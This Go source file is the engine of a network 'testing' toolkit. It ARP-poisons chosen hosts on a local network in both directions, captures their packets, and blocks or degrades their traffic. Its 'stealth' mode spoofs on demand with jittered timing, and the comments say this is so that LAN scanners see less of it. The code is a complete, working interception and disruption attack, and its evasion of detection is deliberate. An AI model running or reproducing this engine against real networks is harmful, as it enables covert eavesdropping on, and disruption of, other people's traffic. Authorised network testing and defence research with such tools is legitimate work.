// GNULTE — network testing toolkit.
//
// Copyright (C) 2026 Neptune Productions.
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// This program is distributed in the hope that it will be useful, but
// WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program. If not, see <https://www.gnu.org/licenses/>.

// Package engine implements the GNULTE traffic-impairment/block engine.
//
// Exact behaviour mirrors the Bash GNULTE v8.3 engine: per-target ARP
// spoofing in both directions, optional IP forwarding that is toggled only
// for the length of a test, 100% block mode via FORWARD-chain DROPs, a
// per-target tc tree (root htb + netem leaf) that leaves non-target traffic
// untouched, and in-process pcap capture.
package engine

import (
	"context"
	"errors"
	"fmt"
	"io"
	"math/rand"
	"net"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"time"

	"gnulte-go/internal/arpspoof"
	"gnulte-go/internal/discover"
)

var roll = rand.New(rand.NewSource(time.Now().UnixNano()))

// verboseHook is the active transcript callback for the current session. It is
// installed by Start and cleared when Start returns (the session config keeps
// its own copy). Run under the session lock by callers that need ordering, but
// in practice every call happens on the single main flow.
var verboseHook func(line string)

// Mode selects shape (impairment) or full block.
type Mode int

const (
	ModeShape Mode = iota
	ModeBlock
)

// Config is the fully-resolved traffic test configuration.
type Config struct {
	Interface  string
	Gateway    string
	Targets    []string
	RangeStart string // when set, block mode does not DROP this host
	Mode       Mode

	LatencyMS     int
	JitterMS      int
	LossPct       int
	DupPct        int
	ReorderPct    int
	BandwidthKbps int

	CaptureFile string // "" = none, "-" = stdout
	Quiet       bool

	// Stealth uses the in-Go, on-demand ARP spoofer instead of arpspoof(8):
	// it answers ARP requests only when asked and re-arms caches with a slow
	// jittered refresh, so other scanners on the LAN see far less activity.
	Stealth bool

	// Verbose, when set, receives every privilege-requiring command the engine
	// runs (iptables, tc, arpspoof, sysctls) as a single shell line, plus a note
	// for the work the engine now does in-process (such as capture). It is the
	// pre-permission command transcript: tools surface it to the operator live
	// and fold it into the report so the exact commands that ran with root are
	// always on the record. May be nil.
	Verbose func(line string)
}

// Validate performs the same parameter sanity checks as the Bash version.
func (c *Config) Validate() error {
	if c.Interface == "" {
		return errors.New("network interface is required")
	}
	if c.Gateway == "" {
		return errors.New("gateway could not be resolved")
	}
	if len(c.Targets) == 0 {
		return errors.New("at least one target is required")
	}
	for _, t := range c.Targets {
		if net.ParseIP(t) == nil {
			return fmt.Errorf("invalid target IP %q", t)
		}
	}
	if c.LatencyMS < 0 || c.JitterMS < 0 || c.LossPct < 0 || c.DupPct < 0 || c.ReorderPct < 0 {
		return errors.New("impairment parameters cannot be negative")
	}
	if c.LossPct > 100 || c.DupPct > 100 || c.ReorderPct > 100 {
		return errors.New("loss/duplicate/reorder cannot exceed 100%")
	}
	total := c.LossPct + c.DupPct + c.ReorderPct
	if total > 100 {
		return errors.New("loss+duplicate+reorder must total 100% or less")
	}
	return nil
}

// DepsCheck lists problems preventing a test (empty = ready).
func DepsCheck(c *Config) []string {
	var problems []string
	// tc is the kernel interface we still drive out of process. Telemetry no
	// longer needs ping(8): the raw-ICMP echo is in-process.
	deps := []string{"tc"}
	if !c.Stealth {
		// Stealth mode uses the in-Go ARP spoofer, so arpspoof(8) is not needed.
		deps = append(deps, "arpspoof")
	}
	for _, bin := range deps {
		if _, err := exec.LookPath(bin); err != nil {
			problems = append(problems, fmt.Sprintf("missing required command: %s", bin))
		}
	}
	if !fileExists("/proc/sys/net/ipv4/ip_forward") {
		problems = append(problems, "/proc/sys/net/ipv4/ip_forward unavailable (not on Linux?)")
	}
	return problems
}

func fileExists(p string) bool {
	_, err := os.Stat(p)
	return err == nil
}

func requireRoot() error {
	if os.Geteuid() != 0 {
		return errors.New("the traffic engine must run as root — re-run with sudo")
	}
	return nil
}

// netemArgs builds the netem sub-options (mirrors Bash NETEM_ARGS).
func netemArgs(c *Config) []string {
	a := []string{"delay", fmt.Sprintf("%dms", c.LatencyMS), fmt.Sprintf("%dms", c.JitterMS)}
	if c.LossPct > 0 {
		a = append(a, "loss", fmt.Sprintf("%d%%", c.LossPct))
	}
	if c.DupPct > 0 {
		a = append(a, "duplicate", fmt.Sprintf("%d%%", c.DupPct))
	}
	if c.ReorderPct > 0 {
		a = append(a, "reorder", fmt.Sprintf("%d%%", c.ReorderPct), "gap", "5")
	}
	return a
}

func rate(c *Config) string {
	if c.BandwidthKbps <= 0 {
		return "1gbit"
	}
	return fmt.Sprintf("%dkbit", c.BandwidthKbps)
}

// tcTreeCommands lists, in order, the commands that build the per-target
// shaping tree. Pure so it can be unit-tested.
func tcTreeCommands(c *Config, iface string) [][]string {
	cmds := [][]string{
		{"qdisc", "del", "dev", iface, "root"},
		{"qdisc", "add", "dev", iface, "root", "handle", "1:", "htb", "default", "999"},
		{"class", "add", "dev", iface, "parent", "1:", "classid", "1:999", "htb", "rate", "1gbit", "ceil", "1gbit"},
		{"class", "add", "dev", iface, "parent", "1:", "classid", "1:10", "htb", "rate", rate(c), "ceil", rate(c)},
	}
	na := netemArgs(c)
	qdisc := []string{"qdisc", "add", "dev", iface, "parent", "1:10", "handle", "10:", "netem"}
	cmds = append(cmds, append(qdisc, na...))
	for _, tp := range c.Targets {
		cmds = append(cmds,
			[]string{"filter", "add", "dev", iface, "parent", "1:", "protocol", "ip", "prio", "1", "u32", "match", "ip", "dst", tp + "/32", "flowid", "1:10"},
			[]string{"filter", "add", "dev", iface, "parent", "1:", "protocol", "ip", "prio", "1", "u32", "match", "ip", "src", tp + "/32", "flowid", "1:10"},
		)
	}
	return cmds
}

// tcChangeCommands lists the live-update commands (class change + netem change).
func tcChangeCommands(c *Config, iface string) [][]string {
	cmds := [][]string{
		{"class", "change", "dev", iface, "parent", "1:", "classid", "1:10", "htb", "rate", rate(c), "ceil", rate(c)},
	}
	na := netemArgs(c)
	qdisc := []string{"qdisc", "change", "dev", iface, "parent", "1:10", "handle", "10:", "netem"}
	return append(cmds, append(qdisc, na...))
}

// blockRules returns FORWARD-chain DROP match fragments for block mode,
// e.g. {"-d", "1.2.3.4", "-j", "DROP"}. They are applied with -I and torn
// down with -D so Stop() can use the identical fragment.
func blockRules(c *Config) [][]string {
	var rules [][]string
	for _, t := range c.Targets {
		if c.RangeStart != "" && t == c.RangeStart {
			continue
		}
		rules = append(rules, []string{"-d", t, "-j", "DROP"})
		rules = append(rules, []string{"-s", t, "-j", "DROP"})
	}
	return rules
}

func readForward() (string, error) {
	b, err := os.ReadFile("/proc/sys/net/ipv4/ip_forward")
	if err != nil {
		return "", err
	}
	return strings.TrimSpace(string(b)), nil
}

func writeForward(v string) error {
	traceCommand("echo", v, ">", "/proc/sys/net/ipv4/ip_forward")
	return os.WriteFile("/proc/sys/net/ipv4/ip_forward", []byte(v+"\n"), 0o644)
}

// Session tracks everything Start preconditioned, so Stop() restores it.
type Session struct {
	mu             sync.Mutex
	stopped        bool
	cfg            Config
	origForward    string
	forwardTouched bool
	drops          []string
	spoofs         []*exec.Cmd
	qdiscBefore    string
	qdiscBeforeErr string // why the original qdisc could not be recorded
	qdiscApplied   bool
	restoreErr     []string
	capture        *captureHandle

	// Stealth ARP spoofing (in-Go, on-demand) replaces arpspoof children.
	stealthSpoof  *arpspoof.Spoofer
	stealthCancel context.CancelFunc
	stealthDone   chan struct{}
}

// Start arms the test: forwarding, block rules, capture, spoofing, shaping.
// Children (capture/spoof/tc) are tied to ctx so an interrupt cancels them
// promptly; cleanup commands run in their own process group so a terminal
// Ctrl+C cannot kill the restore mid-way.
func Start(ctx context.Context, cfg Config) (*Session, error) {
	if err := cfg.Validate(); err != nil {
		return nil, err
	}
	if err := requireRoot(); err != nil {
		return nil, err
	}
	if problems := DepsCheck(&cfg); len(problems) > 0 {
		return nil, errors.New(strings.Join(problems, "; "))
	}

	s := &Session{cfg: cfg}
	if cfg.Verbose != nil {
		verboseHook = cfg.Verbose
		defer func() { verboseHook = nil }()
	}
	orig, err := readForward()
	if err != nil {
		return nil, err
	}
	s.origForward = orig

	// -- IP forwarding: block stops it, shape enables it.
	switch cfg.Mode {
	case ModeBlock:
		if orig != "0" {
			if err := writeForward("0"); err != nil {
				return nil, err
			}
			s.forwardTouched = true
		}
		drops := blockRules(&cfg)
		for _, r := range drops {
			args := []string{"-I", "FORWARD"}
			args = append(args, r...)
			if err := runRoot("iptables", args...); err != nil {
				s.Stop()
				return nil, fmt.Errorf("iptables %s: %w", strings.Join(args, " "), err)
			}
			s.drops = append(s.drops, strings.Join(r, " "))
		}
	case ModeShape:
		if orig != "1" {
			if err := writeForward("1"); err != nil {
				return nil, err
			}
			s.forwardTouched = true
		}
	}

	// -- Capture (optional).
	if cfg.CaptureFile != "" {
		if err := s.startCapture(ctx); err != nil {
			// By now forwarding has been toggled and/or FORWARD DROPs inserted,
			// so a failed capture must still tear the session down. Every other
			// error path in Start calls Stop; skipping it here left the box
			// firewalled with nothing in the output mentioning it.
			s.Stop()
			return nil, err
		}
	}

	// -- ARP spoofing, both directions, per target.
	if err := s.startSpoofs(ctx); err != nil {
		s.Stop()
		return nil, err
	}

	// -- Traffic shaping (shape mode only).
	if cfg.Mode == ModeShape {
		if err := s.applyTC(ctx); err != nil {
			s.Stop()
			return nil, err
		}
	}

	return s, nil
}

// runRoot runs a privilege-requiring command detached from the terminal's
// process group, so a Ctrl+C on the session does not kill the restore. The
// command line is reported to the transcript hook, if any.
func runRoot(name string, args ...string) error {
	traceCommand(append([]string{name}, args...)...)
	cmd := exec.Command(name, args...)
	cmd.SysProcAttr = &syscall.SysProcAttr{Setpgid: true}
	return cmd.Run()
}

// traceCommand feeds a privilege-requiring command line to the transcript
// hook installed by Start. Safe to call with no hook present.
func traceCommand(pieces ...string) {
	if verboseHook != nil {
		verboseHook(strings.Join(pieces, " "))
	}
}

// startCapture arms the in-process capture: a raw AF_PACKET socket feeding a
// libpcap file. The socket is opened synchronously, so a permission or interface
// problem surfaces here (across Start's error path) instead of as a capture that
// quietly records nothing.
func (s *Session) startCapture(ctx context.Context) error {
	// Overwrite guard (mirrors the old tcpdump behaviour).
	if s.cfg.CaptureFile != "-" {
		if fi, err := os.Stat(s.cfg.CaptureFile); err == nil && fi.Mode().IsRegular() {
			return fmt.Errorf("capture file %s already exists (move it or delete it first)", s.cfg.CaptureFile)
		}
	}

	var dst io.WriteCloser
	if s.cfg.CaptureFile == "-" {
		dst = writeCloser{os.Stdout}
	} else {
		f, err := os.OpenFile(s.cfg.CaptureFile, os.O_CREATE|os.O_WRONLY|os.O_EXCL, 0o644)
		if err != nil {
			return fmt.Errorf("capture file %s: %w", s.cfg.CaptureFile, err)
		}
		dst = f
	}

	src, err := newFrameSource(s.cfg.Interface)
	if err != nil {
		dst.Close()
		if s.cfg.CaptureFile != "-" {
			os.Remove(s.cfg.CaptureFile)
		}
		return fmt.Errorf("capture on %s: %w", s.cfg.Interface, err)
	}

	cctx, cancel := context.WithCancel(ctx)
	h := &captureHandle{cancel: cancel, done: make(chan struct{})}
	s.capture = h
	go func() {
		defer close(h.done)
		captureLoop(cctx, src, dst, hostSet(s.cfg.Targets))
	}()
	traceCommand("in-process capture", s.cfg.Interface, "->", s.cfg.CaptureFile)
	return nil
}

func (s *Session) startSpoofs(ctx context.Context) error {
	if s.cfg.Stealth {
		return s.startStealthSpoof(ctx)
	}
	for _, t := range s.cfg.Targets {
		// target -> we are the gateway
		c1 := exec.CommandContext(ctx, "arpspoof", "-i", s.cfg.Interface, "-t", t, s.cfg.Gateway)
		traceCommand("arpspoof", "-i", s.cfg.Interface, "-t", t, s.cfg.Gateway)
		c1.SysProcAttr = &syscall.SysProcAttr{Setpgid: true}
		c1.Stdout, c1.Stderr = nil, nil
		if err := c1.Start(); err != nil {
			return fmt.Errorf("arpspoof %s: %w", t, err)
		}
		time.Sleep(time.Second)
		if c1.Process.Signal(syscall.Signal(0)) != nil {
			s.killSpoof(c1)
			return fmt.Errorf("arpspoof exited immediately for %s (check interface/route)", t)
		}
		s.spoofs = append(s.spoofs, c1)

		// gateway -> we are the target
		c2 := exec.CommandContext(ctx, "arpspoof", "-i", s.cfg.Interface, "-t", s.cfg.Gateway, t)
		traceCommand("arpspoof", "-i", s.cfg.Interface, "-t", s.cfg.Gateway, t)
		c2.SysProcAttr = &syscall.SysProcAttr{Setpgid: true}
		c2.Stdout, c2.Stderr = nil, nil
		if err := c2.Start(); err != nil {
			s.killSpoof(c1)
			return fmt.Errorf("arpspoof gateway-side: %w", err)
		}
		time.Sleep(time.Second)
		if c2.Process.Signal(syscall.Signal(0)) != nil {
			s.killSpoof(c2)
			return fmt.Errorf("arpspoof exited immediately for gateway side (check interface/route)")
		}
		s.spoofs = append(s.spoofs, c2)
	}
	return nil
}

func (s *Session) killSpoof(c *exec.Cmd) {
	if c.Process == nil {
		return
	}
	_ = syscall.Kill(-c.Process.Pid, syscall.SIGTERM)
	// Wait with an escalation, like stopCapture: a spoof child that wedges
	// must not hang Stop — Stop holds the session lock for the entire
	// teardown, so one blocked Wait silently skips the qdisc/iptables/
	// forwarding restore behind it.
	done := make(chan struct{})
	go func() {
		_, _ = c.Process.Wait()
		close(done)
	}()
	select {
	case <-done:
	case <-time.After(3 * time.Second):
		_ = syscall.Kill(-c.Process.Pid, syscall.SIGKILL)
		<-done
	}
}

// stealthTarget is one spoofed host: the victim's IP and learned MAC.
type stealthTarget struct {
	ip  net.IP
	mac net.HardwareAddr
}

// startStealthSpoof arms the in-Go, on-demand ARP spoofer. It opens one
// AF_PACKET socket on the interface, poisons each victim's cache with a single
// directed unicast reply (we are the gateway), and then stays quiet: the pump
// answers broadcast ARP requests only when a victim asks about the gateway (or
// the gateway asks about a victim) and re-arms caches with a slow jittered
// refresh so the poison never expires. Unlike arpspoof(8) it sends no
// heartbeat of unsolicited replies, so an observer running its own ARP sweep
// sees ordinary-looking request/answer traffic at most.
func (s *Session) startStealthSpoof(ctx context.Context) error {
	sp, err := arpspoof.Open(s.cfg.Interface)
	if err != nil {
		return fmt.Errorf("stealth ARP: %v", err)
	}
	gw := net.ParseIP(s.cfg.Gateway)
	if gw == nil {
		_ = sp.Close()
		return errors.New("stealth ARP: invalid gateway address")
	}
	targets := make([]stealthTarget, 0, len(s.cfg.Targets))
	for _, t := range s.cfg.Targets {
		mac, err := arpLookupMAC(s.cfg.Interface, t)
		if err != nil {
			_ = sp.Close()
			return fmt.Errorf("stealth ARP: %v", err)
		}
		targets = append(targets, stealthTarget{ip: net.ParseIP(t), mac: mac})
	}
	// Arm each victim's cache once: an unsolicited unicast reply is how real
	// routers announce a link change, so it reads as normal traffic.
	for _, e := range targets {
		if err := sp.SendReply(e.mac, e.ip, gw); err != nil {
			_ = sp.Close()
			return fmt.Errorf("stealth ARP: %v", err)
		}
	}
	ctx, cancel := context.WithCancel(ctx)
	s.stealthSpoof = sp
	s.stealthCancel = cancel
	s.stealthDone = make(chan struct{})
	go s.stealthPump(ctx, sp, gw, targets)
	return nil
}

// stealthPump listens for ARP requests and re-arms caches on a slow, jittered
// schedule. It never floods: no unsolicited broadcast, no second-by-second
// heartbeat, exactly one reply per relevant question.
func (s *Session) stealthPump(ctx context.Context, sp *arpspoof.Spoofer, gw net.IP, targets []stealthTarget) {
	defer close(s.stealthDone)
	nextRefresh := time.Now().Add(stealthInterval())
	for {
		select {
		case <-ctx.Done():
			return
		case <-time.After(100 * time.Millisecond):
		}
		if time.Now().After(nextRefresh) {
			for _, e := range targets {
				_ = sp.SendReply(e.mac, e.ip, gw)
			}
			nextRefresh = time.Now().Add(stealthInterval())
		}
		// Drain any pending requests (bounded so one request can't hog the loop).
		for i := 0; i < 64; i++ {
			fromMAC, fromIP, asked, ok, err := sp.ReadRequest()
			if err != nil {
				// Transient shortfalls (EINTR on a signal, ENOBUFS under load)
				// are ordinary on a raw socket and must not kill the pump —
				// a single one silently stopping all spoofing mid-test was
				// indistinguishable from the test working. Only a persistent
				// error (e.g. EBADF: the socket was closed) ends the loop.
				if err == syscall.EINTR || err == syscall.ENOBUFS || err == syscall.EAGAIN {
					break
				}
				traceCommand(fmt.Sprintf("arp spoof pump stopped: %v", err))
				return
			}
			if !ok {
				break // nothing waiting (EAGAIN)
			}
			if sp.IsLocal(fromMAC) {
				continue // our own echo
			}
			if asked.Equal(gw) && ipInTargets(fromIP, targets) {
				// A victim wants to know who the gateway is. We answer.
				_ = sp.SendReply(fromMAC, fromIP, gw)
				continue
			}
			if fromIP.Equal(gw) {
				// The gateway wants a victim's MAC. We claim to be them.
				for _, e := range targets {
					if asked.Equal(e.ip) {
						_ = sp.SendReply(fromMAC, asked, e.ip)
						break
					}
				}
			}
		}
	}
}

// stealthInterval returns the base refresh period (≈30s) with ±25% jitter so a
// scanner correlating refresh cadence sees irregular, human-ordinary timing.
func stealthInterval() time.Duration {
	return time.Duration(22500+int(roll.Intn(15001))) * time.Millisecond
}

func ipInTargets(ip net.IP, targets []stealthTarget) bool {
	for _, e := range targets {
		if e.ip.Equal(ip) {
			return true
		}
	}
	return false
}

// arpLookupMAC resolves ip's MAC via the kernel ARP table, and if it is not
// cached yet (a victim was just pinged, so it usually is) asks the address
// directly with one in-Go who-has. No helper binary involved.
func arpLookupMAC(iface, ip string) (net.HardwareAddr, error) {
	if hw := macFromProcARP(iface, ip); hw != nil {
		return hw, nil
	}
	// Ask on the wire. A victim that filters ping but answers ARP still resolves.
	if hw, err := discover.ResolveMAC(context.Background(), iface, ip); err == nil && len(hw) == 6 {
		return hw, nil
	}
	if hw := macFromProcARP(iface, ip); hw != nil {
		return hw, nil
	}
	return nil, fmt.Errorf("cannot resolve MAC for %s (run a ping first)", ip)
}

func macFromProcARP(iface, ip string) net.HardwareAddr {
	data, err := os.ReadFile("/proc/net/arp")
	if err != nil {
		return nil
	}
	for _, line := range strings.Split(string(data), "\n") {
		f := strings.Fields(line)
		if len(f) < 6 || f[0] != ip || f[5] != iface {
			continue
		}
		hw, err := net.ParseMAC(f[3])
		if err == nil && len(hw) == 6 {
			return hw
		}
	}
	return nil
}

func (s *Session) applyTC(ctx context.Context) error {
	before, err := exec.Command("tc", "qdisc", "show", "dev", s.cfg.Interface).CombinedOutput()
	if err == nil {
		lines := strings.SplitN(string(before), "\n", 2)
		if len(lines) > 0 {
			s.qdiscBefore = strings.TrimSpace(lines[0])
		}
	} else {
		// A failed read must not silently drop the restore target: if the
		// rebuild below succeeds we would delete an original qdisc we can no
		// longer name. Surface it at teardown instead.
		s.qdiscBeforeErr = fmt.Sprintf("tc qdisc show: %v", err)
	}
	// Deleting the current root qdisc is best-effort (none may exist yet).
	_ = runRoot("tc", "qdisc", "del", "dev", s.cfg.Interface, "root")
	// Mark the qdisc as applied *before* the tree is built: from this moment
	// on a failure (or a Ctrl+C mid-build) must make Stop take the qdisc down
	// again and restore what we recorded. Setting the flag after the build
	// left the original qdisc deleted with half a tree and no cleanup.
	s.qdiscApplied = true
	tree := tcTreeCommands(&s.cfg, s.cfg.Interface)
	for _, args := range tree[1:] {
		cmd := exec.CommandContext(ctx, "tc", args...)
		cmd.SysProcAttr = &syscall.SysProcAttr{Setpgid: true}
		if err := cmd.Run(); err != nil {
			return fmt.Errorf("tc %s: %w", strings.Join(args, " "), err)
		}
	}
	return nil
}

// UpdateParams applies new impairment values live (class + netem change).
func (s *Session) UpdateParams(c Config) error {
	s.mu.Lock()
	defer s.mu.Unlock()
	if s.stopped || !s.qdiscApplied || s.cfg.Mode != ModeShape {
		return errors.New("live parameter updates are only available on an active shaping test")
	}
	cur := s.cfg
	cur.LatencyMS = c.LatencyMS
	cur.JitterMS = c.JitterMS
	cur.LossPct = c.LossPct
	cur.DupPct = c.DupPct
	cur.ReorderPct = c.ReorderPct
	cur.BandwidthKbps = c.BandwidthKbps
	for _, args := range tcChangeCommands(&cur, s.cfg.Interface) {
		if err := runRoot("tc", args...); err != nil {
			return fmt.Errorf("tc change %s: %w", strings.Join(args, " "), err)
		}
	}
	s.cfg = cur
	return nil
}

func (s *Session) stopSpoofs() {
	// Stealth spoofer first: it shares the session via fields, so tidy it
	// before the classic arpspoof children.
	if s.stealthSpoof != nil {
		if s.stealthCancel != nil {
			s.stealthCancel()
		}
		if s.stealthDone != nil {
			<-s.stealthDone
		}
		_ = s.stealthSpoof.Close()
		s.stealthSpoof = nil
		s.stealthCancel, s.stealthDone = nil, nil
	}
	for _, c := range s.spoofs {
		s.killSpoof(c)
	}
	s.spoofs = nil
	if s.cfg.Gateway != "" {
		s.announceRealGateway()
	}
}

// announceRealGateway broadcasts the gateway's real MAC so neighbors re-learn
// the true owner immediately instead of waiting out the poison's ARP-cache
// TTL. The old cleanup used `arping -U … gateway`, which advertises *our*
// interface MAC as the gateway — the same claim the test just spent its run
// enforcing — so it actively re-poisons the link at teardown. Putting the
// router's own MAC in the sender field is exactly what correcting it needs,
// and that requires raw-crafting the frame (arping's -s sets the IP, never
// the sender MAC).
func (s *Session) announceRealGateway() {
	gw := net.ParseIP(s.cfg.Gateway)
	if gw == nil {
		return
	}
	gmac, err := arpLookupMAC(s.cfg.Interface, s.cfg.Gateway)
	if err != nil {
		traceCommand(fmt.Sprintf("gateway MAC unknown at teardown (%v); neighbors re-learn on ARP cache expiry", err))
		return
	}
	sp, err := arpspoof.Open(s.cfg.Interface)
	if err != nil {
		traceCommand(fmt.Sprintf("gateway re-announce skipped: %v", err))
		return
	}
	defer sp.Close()
	bcast := net.HardwareAddr{0xff, 0xff, 0xff, 0xff, 0xff, 0xff}
	frame := arpspoof.BuildARPReply(gmac, gw, gw, bcast)
	for i := 0; i < 3; i++ {
		if err := sp.SendRaw(frame); err != nil {
			traceCommand(fmt.Sprintf("gateway re-announce failed: %v", err))
			return
		}
		time.Sleep(200 * time.Millisecond)
	}
}

func (s *Session) stopCapture() {
	if s.capture == nil {
		return
	}
	// Cancel the loop; it closes the socket and finishes the pcap file. The
	// read timeout bounds how long the wait can take.
	s.capture.cancel()
	select {
	case <-s.capture.done:
	case <-time.After(3 * time.Second):
	}
	s.capture = nil
	if s.cfg.CaptureFile != "" && s.cfg.CaptureFile != "-" {
		chownToCaller(s.cfg.CaptureFile)
	}
}

// chownToCaller hands a root-owned capture back to the invoking user.
func chownToCaller(path string) {
	uid, err1 := strconv.Atoi(os.Getenv("SUDO_UID"))
	gid, err2 := strconv.Atoi(os.Getenv("SUDO_GID"))
	if err1 != nil || err2 != nil || uid <= 0 || gid <= 0 {
		return
	}
	_ = os.Chown(path, uid, gid)
}

// restoreQdiscArgs reconstructs the previous root qdisc arguments.
func restoreQdiscArgs(iface, before string) []string {
	if before == "" {
		return nil
	}
	f := strings.Fields(before)
	if len(f) < 3 || f[0] != "qdisc" {
		return nil
	}
	kind := f[1]
	switch kind {
	case "none", "noqueue", "nomatch":
		return nil
	}
	handle := f[2]
	rest := []string{}
	for i := 3; i < len(f); i++ {
		switch f[i] {
		case "dev", "root": // keyword + optional value, skip both where present
			if f[i] == "dev" && i+1 < len(f) {
				i++
			}
			continue
		case "refcnt": // keyword + count
			if i+1 < len(f) {
				i++
			}
			continue
		}
		rest = append(rest, f[i])
	}
	args := []string{"qdisc", "add", "dev", iface, "root"}
	if strings.TrimSuffix(handle, ":") != "" {
		args = append(args, "handle", handle)
	}
	args = append(args, kind)
	args = append(args, rest...)
	return args
}

// Stop tears everything down in reverse order and restores the original state.
// Cleanup failures are collected; call RestoreProblems to warn the operator
// rather than pretending connectivity was fully restored.
func (s *Session) Stop() {
	s.mu.Lock()
	defer s.mu.Unlock()
	if s.stopped {
		return
	}
	s.stopped = true

	s.stopSpoofs()

	if s.qdiscApplied {
		if err := runRoot("tc", "qdisc", "del", "dev", s.cfg.Interface, "root"); err != nil {
			s.restoreErr = append(s.restoreErr, "tc qdisc del: "+err.Error())
		} else if args := restoreQdiscArgs(s.cfg.Interface, s.qdiscBefore); len(args) > 0 {
			if err := runRoot("tc", args...); err != nil {
				s.restoreErr = append(s.restoreErr, "tc qdisc restore: "+err.Error())
			}
		} else if s.qdiscBeforeErr != "" {
			// The original qdisc could not be identified before it was
			// deleted, so there is nothing to restore — say so explicitly
			// instead of pretending the link is as we found it.
			s.restoreErr = append(s.restoreErr, s.qdiscBeforeErr+"; original qdisc unknown, not restored")
		}
	}

	if s.forwardTouched {
		if err := writeForward(s.origForward); err != nil {
			s.restoreErr = append(s.restoreErr, "ip_forward restore: "+err.Error())
		}
	}

	for _, d := range s.drops {
		args := []string{"-D", "FORWARD"}
		args = append(args, strings.Fields(d)...)
		if err := runRoot("iptables", args...); err != nil {
			s.restoreErr = append(s.restoreErr, "iptables -D FORWARD: "+err.Error())
		}
	}
	s.drops = nil

	s.stopCapture()
}

// RestoreProblems lists any teardown step that failed to restore the network,
// best-effort only: the caller decides how loudly to complain.
func (s *Session) RestoreProblems() []string {
	return append([]string(nil), s.restoreErr...)
}
